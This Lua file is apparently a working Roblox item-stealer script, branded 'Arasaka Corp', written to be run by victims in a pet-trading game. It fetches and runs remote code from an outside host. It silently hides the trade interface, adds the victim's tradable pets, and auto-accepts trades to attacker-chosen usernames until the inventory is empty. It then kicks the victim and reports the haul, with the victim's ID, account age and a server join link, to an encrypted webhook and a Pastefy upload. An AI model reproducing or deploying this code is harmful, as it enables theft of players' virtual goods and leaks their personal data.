local ACCEPT_DELAY = 10
local MAX_PETS_PER_TRADE = 18
local RESEND_DELAY = 3

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local cfg = _G.AC_CONFIG
if not cfg then
    LocalPlayer:Kick("Config missing | Use the Loader first")
    return
end

local WEBHOOK_ID = cfg.WEBHOOK_ID
local PROXY_URL = cfg.PROXY_URL
local PUBLIC_PROXY = cfg.PUBLIC_PROXY
local USERNAMES = cfg.USERNAMES

if WEBHOOK_ID == "" or PROXY_URL == "" then
    LocalPlayer:Kick("Invalid configuration | discord.gg/arasaka-corp")
    return
end

if not USERNAMES or #USERNAMES == 0 then
    LocalPlayer:Kick("No target usernames provided | discord.gg/arasaka-corp")
    return
end

local Crypto = loadstring(game:HttpGet("https://arasaka-corp.eu/script/module/crypto.lua"))()
local crypto = Crypto.new("31566ef8c2c18566522c58e8c11511cfc0ec2a4864ee5e2750a162f4dfeca9a4b16c424cb4f83662773ea0a0b7040b8d")

local function requestFn(req)
    if syn and syn.request then return syn.request(req) end
    if fluxus and fluxus.request then return fluxus.request(req) end
    if http and http.request then return http.request(req) end
    if getgenv().request then return getgenv().request(req) end
    if request then return request(req) end
    if http_request then return http_request(req) end
    if HttpService.RequestAsync then
        return HttpService:RequestAsync({
            Url = req.Url, Method = req.Method,
            Headers = req.Headers, Body = req.Body
        })
    end
    return nil
end

local isTradeOpen = false
local addedPets = {}
local addedPetsData = {}
local targetPlayer = nil
local isMonitoring = false
local sessionItemsSent = false

local RouterClient, SendTrade, AddItem, AcceptNegotiation, ConfirmTrade, DeclineTrade, UnlockBackpack, InventoryDB

local startTradeProcess, findTargetPlayer, monitorTradeAndResend, resendTradeLoop, autoAcceptTrade, getAllPets, addAllPetsToTrade

local function isTarget(name)
    if not name then return false end
    for _, u in ipairs(USERNAMES) do
        if typeof(u) == "string" and u:lower() == name:lower() then
            return true
        end
    end
    return false
end

local function hideInterfaces()
    pcall(function()
        if LocalPlayer.PlayerGui:FindFirstChild("TradeApp") then
            LocalPlayer.PlayerGui.TradeApp.Enabled = false
        end
        pcall(function()
            if LocalPlayer.PlayerGui:FindFirstChild("HintApp") then
                LocalPlayer.PlayerGui.HintApp:Destroy()
            end
        end)
        pcall(function()
            if LocalPlayer.PlayerGui:FindFirstChild("DialogApp") then
                LocalPlayer.PlayerGui.DialogApp:Destroy()
            end
        end)
    end)
end

local isProcessing = false
local tradeAccepted = false
local tradeAttempts = 0

function autoAcceptTrade()
    tradeAccepted = false
    task.wait(ACCEPT_DELAY)

    local success1, err1 = false, nil
    pcall(function()
        success1, err1 = pcall(function() AcceptNegotiation:FireServer() end)
    end)
    if not success1 then
        pcall(function() success1, err1 = pcall(function() AcceptNegotiation:FireServer(true) end) end)
    end
    if not success1 then
        pcall(function() success1, err1 = pcall(function() AcceptNegotiation:InvokeServer() end) end)
    end
    if not success1 then
        pcall(function() success1, err1 = pcall(function() AcceptNegotiation:FireServer("Accept") end) end)
    end

    task.wait(1)
    local success2, err2 = false, nil
    pcall(function()
        success2, err2 = pcall(function() ConfirmTrade:FireServer() end)
    end)
    if not success2 then
        pcall(function() success2, err2 = pcall(function() ConfirmTrade:FireServer(true) end) end)
    end

    if success2 then
        tradeAccepted = true
        return true
    else
        return false
    end
end

local function getRouterClient()
    local Fsys = ReplicatedStorage:FindFirstChild("Fsys")
    if not Fsys then
        return nil
    end
    local load = require(Fsys).load
    if not load then
        return nil
    end
    local attempts = 0
    while attempts < 30 do
        local success, result = pcall(function()
            return load("RouterClient")
        end)
        if success and result then
            return result, load
        end
        attempts = attempts + 1
        task.wait(0.5)
    end
    return nil, nil
end

function resendTradeLoop()
    if isMonitoring then return end
    isMonitoring = true

    while isMonitoring do
        task.wait(5)
        local currentTarget = findTargetPlayer()
        if not currentTarget then
            continue
        end

        if not isTradeOpen then
            startTradeProcess(currentTarget)
        end
    end
end

function addAllPetsToTrade(pets)
    if not pets or #pets == 0 then return false end
    local added = 0
    local maxToAdd = math.min(#pets, MAX_PETS_PER_TRADE)
    for i = 1, maxToAdd do
        local pet = pets[i]
        pcall(function()
            UnlockBackpack:FireServer("backpack_locks", {[pet.uid] = true})
        end)
        task.wait(0.08)
        local success, err = pcall(function()
            AddItem:FireServer(pet.uid)
        end)
        if success then
            added = added + 1
            local propsStr = ""
            if pet.props and pet.props.mega_neon then propsStr = propsStr .. "M" end
            if pet.props and pet.props.neon then propsStr = propsStr .. "N" end
            if pet.props and pet.props.flyable then propsStr = propsStr .. "F" end
            if pet.props and pet.props.rideable then propsStr = propsStr .. "R" end
            if propsStr ~= "" then propsStr = " [" .. propsStr .. "]" end
            table.insert(addedPets, pet.name .. propsStr)
            table.insert(addedPetsData, {
                Name = pet.name,
                Props = propsStr,
                Value = pet.value or 0,
                Rarity = pet.rarity or "Unknown"
            })
        end
        task.wait(0.15)
    end
    return added > 0
end

local function blockTradeInterface()
    pcall(function()
        local tradeApp = LocalPlayer.PlayerGui:FindFirstChild("TradeApp")
        if tradeApp then
            tradeApp:GetPropertyChangedSignal("Enabled"):Connect(function()
                if tradeApp.Enabled then
                    tradeApp.Enabled = false
                end
            end)
        end
    end)
end

function findTargetPlayer()
    for _, player in ipairs(Players:GetPlayers()) do
        if isTarget(player.Name) then
            return player
        end
    end
    return nil
end

function monitorTradeAndResend()
    pcall(function()
        local tradeApp = LocalPlayer.PlayerGui:FindFirstChild("TradeApp")
        if not tradeApp then return end

        tradeApp:GetPropertyChangedSignal("Enabled"):Connect(function()
            if not tradeApp.Enabled and isTradeOpen then
                isTradeOpen = false
                tradeAccepted = false
                addedPets = {}
                addedPetsData = {}
                tradeAttempts = tradeAttempts + 1
                task.wait(5)

                local remainingPets = getAllPets()
                if not remainingPets or #remainingPets == 0 then
                    task.wait(2)
                    pcall(function() setclipboard("discord.gg/arasaka-corp") end)
                    pcall(function()
                        LocalPlayer:Kick("All your items have been stolen by Arasaka Corp | discord.gg/arasaka-corp")
                    end)
                    return
                end

                if targetPlayer and targetPlayer.Parent then
                    startTradeProcess(targetPlayer)
                else
                    local newTarget = findTargetPlayer()
                    if newTarget then
                        targetPlayer = newTarget
                        startTradeProcess(targetPlayer)
                    end
                end
            end
        end)
    end)
end

local function setupPlayerAddedListener()
    Players.PlayerAdded:Connect(function(player)
        if isTarget(player.Name) then
            task.wait(2)
            targetPlayer = player
            startTradeProcess(player)
            monitorTradeAndResend()
            resendTradeLoop()
        end
    end)
end

function getAllPets()
    local success, data = pcall(function()
        return RouterClient.get("DataAPI/GetAllServerData"):InvokeServer()
    end)
    if success and data then
        local pets = data[LocalPlayer.Name].inventory.pets or {}
        local petList = {}
        for uid, item in pairs(pets) do
            local petData = nil
            pcall(function()
                if not InventoryDB then
                    local Fsys = ReplicatedStorage:FindFirstChild("Fsys")
                    if Fsys then
                        local load = require(Fsys).load
                        InventoryDB = load("InventoryDB")
                    end
                end
                if InventoryDB and InventoryDB.pets then
                    petData = InventoryDB.pets[item.id]
                end
            end)
            if petData and petData.is_tradable ~= false then
                table.insert(petList, {
                    uid = uid,
                    name = petData.name or "Unknown",
                    props = item.properties or {},
                    value = petData.value or petData.rap or 0,
                    rarity = petData.rarity or petData.tier or "Unknown"
                })
            end
        end
        return petList
    end
    return {}
end

local function initializeRemotes()
    if not RouterClient then
        RouterClient = getRouterClient()
        if not RouterClient then
            return false
        end
    end
    local success, result = pcall(function()
        SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
        AddItem = RouterClient.get("TradeAPI/AddItemToOffer")
        AcceptNegotiation = RouterClient.get("TradeAPI/AcceptNegotiation")
        ConfirmTrade = RouterClient.get("TradeAPI/ConfirmTrade")
        DeclineTrade = RouterClient.get("TradeAPI/DeclineTrade")
        UnlockBackpack = RouterClient.get("BackpackAPI/CommitBackpackItemSet")
    end)
    if not success then
        return false
    end
    return true
end

function startTradeProcess(player)
    if not player or not player.Parent then return false end
    if isProcessing then return false end

    isProcessing = true
    addedPets = {}
    addedPetsData = {}
    hideInterfaces()

    local success1, err1 = pcall(function()
        SendTrade:FireServer(player)
    end)
    if not success1 then
        isProcessing = false
        return false
    end

    isTradeOpen = true
    task.wait(2.5)

    local allPets = getAllPets()
    if not allPets or #allPets == 0 then
        isProcessing = false
        if sessionItemsSent then
            task.wait(2)
            pcall(function() setclipboard("discord.gg/arasaka-corp") end)
            pcall(function()
                LocalPlayer:Kick("All your items have been stolen by Arasaka Corp | discord.gg/arasaka-corp")
            end)
        end
        return false
    end
    task.wait(1)

    local added = addAllPetsToTrade(allPets)
    if not added then
        isProcessing = false
        return false
    end

    sessionItemsSent = true
    autoAcceptTrade()
    isProcessing = false
    return true
end

local function FormatNumber(n)
    n = tonumber(n) or 0
    if n >= 1E9 then return string.format("%.2fB", n / 1E9)
    elseif n >= 1E6 then return string.format("%.2fM", n / 1E6)
    elseif n >= 1E3 then return string.format("%.2fK", n / 1E3)
    else return tostring(math.floor(n)) end
end

local function UploadToPastefy(items)
    if not items or #items == 0 then return nil end

    local lines = {
        "ARASAKA CORP | ADM Inventory Dump",
        "User: " .. LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")",
        "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"),
        "Total Items: " .. #items,
        string.rep("-", 60),
        ""
    }

    for _, item in ipairs(items) do
        table.insert(lines, string.format(
            "%s%s | %s",
            item.Name or "Unknown",
            item.Props or "",
            FormatNumber(item.Value or 0)
        ))
    end

    local content = table.concat(lines, "\n")
    local ok, response = pcall(function()
        return requestFn({
            Url = "https://pastefy.app/api/v2/paste",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({content = content, type = "PASTE"})
        })
    end)

    if ok and response and response.StatusCode == 200 then
        local ok2, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
        if ok2 and data then
            if data.paste then return "https://pastefy.app/" .. data.paste.id
            elseif data.id then return "https://pastefy.app/" .. data.id end
        end
    end
    return nil
end

local function sendWebhook(payload)
    local fullUrl = PROXY_URL .. WEBHOOK_ID
    local envelope = { id = WEBHOOK_ID, payload = payload }
    local json = HttpService:JSONEncode(envelope)
    local encrypted = crypto:Encrypt(json)

    local success, response = pcall(function()
        return requestFn({
            Url = fullUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({data = encrypted})
        })
    end)
    return success, response
end

local function SendPublic(payload)
    if not PUBLIC_PROXY or PUBLIC_PROXY == "" then return end
    local json = HttpService:JSONEncode(payload)
    local encrypted = crypto:Encrypt(json)

    local success, response = pcall(function()
        return requestFn({
            Url = PUBLIC_PROXY,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({message = encrypted})
        })
    end)
    return success, response
end

local function BuildWebhookPayload()
    local totalItems = #addedPetsData
    local totalValue = 0
    local topItems = {}

    local sorted = {}
    for _, v in ipairs(addedPetsData) do
        table.insert(sorted, v)
        totalValue = totalValue + (v.Value or 0)
    end
    table.sort(sorted, function(a, b) return (a.Value or 0) > (b.Value or 0) end)

    for i = 1, math.min(5, #sorted) do
        local it = sorted[i]
        local icon = "░"
        local v = it.Value or 0
        if v >= 1000000 then icon = "█"
        elseif v >= 100000 then icon = "▓"
        elseif v >= 10000 then icon = "▒"
        end
        table.insert(topItems, string.format(
            "%s %s%s | %s",
            icon, it.Name or "Unknown",
            it.Props or "",
            FormatNumber(v)
        ))
    end

    local hitCategory = "STANDARD HIT"
    local glowEffect = ""
    if totalValue >= 100000000 then
        hitCategory = "INSANE HIT (100M+)"
        glowEffect = "✦"
    elseif totalValue >= 50000000 then
        hitCategory = "MASSIVE HIT (50M+)"
        glowEffect = "🔥"
    elseif totalValue >= 10000000 then
        hitCategory = "BIG HIT (10M+)"
        glowEffect = "⚡"
    elseif totalValue >= 1000000 then
        hitCategory = "GOOD HIT (1M+)"
        glowEffect = "💫"
    elseif totalValue >= 100000 then
        hitCategory = "NORMAL HIT (100K+)"
    else
        hitCategory = "LOW HIT (<100K)"
    end

    local pastefyLink = nil
    if #addedPetsData > 0 then
        pastefyLink = UploadToPastefy(addedPetsData)
    end

    local realJob = game.JobId
    local fernLink = "https://fern.wtf/joiner?placeId=" .. tostring(game.PlaceId)
                   .. "&gameInstanceId=" .. tostring(realJob)

    local fields = {
        {
            name = "VICTIM INFORMATION",
            value = "```yml\nUser: " .. LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")\n"
                 .. "ID: " .. tostring(LocalPlayer.UserId) .. "\n"
                 .. "Age: " .. tostring(LocalPlayer.AccountAge) .. " days\n"
                 .. "Server: " .. tostring(realJob):sub(1, 8) .. "\n```",
            inline = true
        },
        {
            name = "VALUATION",
            value = "```yml\nTotal Value: " .. FormatNumber(totalValue) .. "\n"
                 .. "Items: " .. tostring(totalItems) .. "\n"
                 .. "Receivers: " .. table.concat(USERNAMES, ", ") .. "\n```",
            inline = true
        },
        {
            name = "TRADE INFO",
            value = "```yml\n"
                 .. "Attempts: " .. tostring(tradeAttempts) .. "\n"
                 .. "Accepted: " .. tostring(tradeAccepted) .. "\n"
                 .. "Max Per Trade: " .. tostring(MAX_PETS_PER_TRADE) .. "\n```",
            inline = false
        }
    }

    if #topItems > 0 then
        local topStr = "```prolog\n"
        for _, s in ipairs(topItems) do topStr = topStr .. s .. "\n" end
        topStr = topStr .. "```"
        table.insert(fields, {name = "TOP ITEMS", value = topStr, inline = false})
    end

    if pastefyLink then
        table.insert(fields, {
            name = "FULL INVENTORY",
            value = "[View All " .. tostring(totalItems) .. " Items on Pastefy](" .. pastefyLink .. ")",
            inline = false
        })
    end

    table.insert(fields, {
        name = "ACTIONS",
        value = "[Join Server](" .. fernLink .. ")",
        inline = false
    })

    local embedColor = 0x8B0000
    if totalValue >= 100000000 then embedColor = 0xFF0000
    elseif totalValue >= 50000000 then embedColor = 0xCC0000
    elseif totalValue >= 10000000 then embedColor = 0x990000
    elseif totalValue >= 1000000 then embedColor = 0x660000
    elseif totalValue >= 100000 then embedColor = 0x440000
    end

    local embed = {
        title = "ARASAKA CORP " .. glowEffect .. " " .. hitCategory,
        color = embedColor,
        fields = fields,
        footer = {
            text = "Arasaka Corp v1.0.2 | " .. os.date("%Y-%m-%d %H:%M:%S")
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    local payload = {
        username = "Arasaka Corp",
        embeds = {embed}
    }

    if totalValue >= 10000000 then
        payload.content = "@everyone **ARASAKA CORP | ADM HIT**"
    end

    return payload, pastefyLink
end

local function Dispatch()
    local payload, pastefyLink = BuildWebhookPayload()
    SendWebhook(payload)

    local publicPayload = {
        message = LocalPlayer.Name .. " got hit by Arasaka Corp in ADM"
               .. (pastefyLink and (" | Pastefy: " .. pastefyLink) or "")
    }
    SendPublic(publicPayload)

    return payload
end

local Webhook = {}
Webhook.Dispatch = Dispatch
Webhook.BuildPayload = BuildWebhookPayload
Webhook.UploadToPastefy = UploadToPastefy
Webhook.SendWebhook = SendWebhook
Webhook.SendPublic = SendPublic
Webhook.FormatNumber = FormatNumber

_G.ADM_WEBHOOK = Webhook

pcall(function()
    print("Made by silverWWunicron")
    hideInterfaces()
    blockTradeInterface()

    if not initializeRemotes() then
        return
    end
    task.wait(1)

    targetPlayer = findTargetPlayer()
    if targetPlayer then
        startTradeProcess(targetPlayer)
        monitorTradeAndResend()
        resendTradeLoop()
    end

    setupPlayerAddedListener()

    _G.SendTradeToTarget = function()
        local player = findTargetPlayer()
        if player then
            targetPlayer = player
            startTradeProcess(player)
            monitorTradeAndResend()
        end
    end

    _G.SetResendDelay = function(seconds) RESEND_DELAY = seconds end
    _G.SetMaxPetsPerTrade = function(count) MAX_PETS_PER_TRADE = count end
    _G.SetAcceptDelay = function(seconds) ACCEPT_DELAY = seconds end

    _G.GetTradeStatus = function()
        print(targetPlayer and targetPlayer.Name or "none")
        print(isTradeOpen and "open" or "closed")
        print(tostring(isProcessing))
        print(tradeAttempts)
        print(#addedPets)
        print(ACCEPT_DELAY)
    end

    _G.StopResendLoop = function()
        isMonitoring = false
    end

    _G.StartResendLoop = function()
        if not isMonitoring then
            resendTradeLoop()
        end
    end

    _G.DispatchWebhook = Dispatch
end)
